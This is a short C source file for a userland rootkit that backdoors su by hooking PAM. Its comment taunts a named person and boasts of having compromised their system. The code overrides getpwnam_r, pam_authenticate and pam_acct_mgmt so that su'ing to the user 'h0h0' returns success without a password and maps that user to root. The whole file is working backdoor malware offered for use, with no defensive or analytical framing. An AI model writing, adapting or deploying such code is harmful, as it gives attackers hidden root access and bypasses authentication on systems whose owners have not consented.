/*
	If you are reading this, N, then stop fucking stalking me and leeching off my rep mate.
	I'm writing a rootkit mate, even though I don't root. Cheers.

	Currently a su backdoor by hooking PAM:
		[*] If not su'ing SU_USER, hook real functions, so they still function normally.
		[*] Gets passwd entry for JACK_USER if su'ing SU_USER (pwd.h contains the passwd struct definition, or see man page)
		[*] Wraps PAM functions handling authentication (found via ltrace) -> returns PAM_SUCCESS for SU_USER/PAM_USER (authenticates without question)

	Will add more shit when I get my pegasus.
	Already fucked your system mate, just "su h0h0" and -3 get fucked.
*/

#define  _GNU_SOURCE
#include <string.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <pwd.h>
#include <security/pam_appl.h>

#define SU_USER   "h0h0"
#define JACK_USER "root"


int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result)
{
	int (*real_getpwnam_r)(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result);
	real_getpwnam_r = dlsym(RTLD_NEXT, "getpwnam_r");

	if(strncmp(SU_USER, name, strlen(name)) == 0)
		return real_getpwnam_r(JACK_USER, pwd, buf, buflen, result);

	return real_getpwnam_r(name, pwd, buf, buflen, result);
}

int pam_authenticate(pam_handle_t *pamh, int flags)
{
	int (*real_pam_auth)(pam_handle_t *pamh, int flags);
	const void *item;

	pam_get_item(pamh, PAM_USER, &item);

	if(strncmp(SU_USER, item, strlen(item)) == 0)
		return PAM_SUCCESS;

	real_pam_auth = dlsym(RTLD_NEXT, "pam_authenticate");
	return real_pam_auth(pamh, flags);
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags)
{
	int (*real_pam_mgmt)(pam_handle_t *pamh, int flags);
	const void *item;

    pam_get_item(pamh, PAM_USER, &item);

    if(strncmp(SU_USER, item, strlen(item)) == 0)
        return PAM_SUCCESS;

    real_pam_mgmt = dlsym(RTLD_NEXT, "pam_acct_mgmt");
    return real_pam_mgmt(pamh, flags);
}
